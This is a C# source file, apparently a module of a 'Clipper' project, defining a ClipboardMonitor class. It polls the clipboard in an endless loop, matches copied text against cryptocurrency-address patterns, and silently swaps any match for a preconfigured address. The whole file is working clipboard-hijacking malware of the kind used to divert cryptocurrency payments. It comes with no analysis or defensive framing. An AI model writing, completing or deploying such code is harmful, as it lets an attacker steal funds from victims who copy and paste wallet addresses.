using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper.Modules
{
    internal sealed class ClipboardMonitor
    {
        
        private static string previous_buffer = "";

        
        private static bool clipboard_changed(string buffer)
        {
            if (buffer != previous_buffer)
            {
                previous_buffer = buffer;
                return true;
            }
            return false;
        }

        
        private static void replace_clipboard(string buffer)
        {
            if (string.IsNullOrEmpty(buffer))
                return;
            foreach (KeyValuePair<string, Regex> dictonary in RegexPatterns.patterns)
            {
                string cryptocurrency = dictonary.Key;
                Regex pattern = dictonary.Value;
                if (pattern.Match(buffer).Success)
                {
                    string replace_to = config.addresses[cryptocurrency];
                    if (!string.IsNullOrEmpty(replace_to) && !buffer.Equals(replace_to))
                    {
                        
                        Clipboard.SetText(replace_to);
                        return;
                    }
                }
            }
        }

        
        public static void run()
        {
            while (true)
            {
                string buffer = Clipboard.GetText();
                if (clipboard_changed(buffer))
                    replace_clipboard(buffer);
                System.Threading.Thread.Sleep(config.clipboard_check_delay * 1000);
            }
        }


    }
}
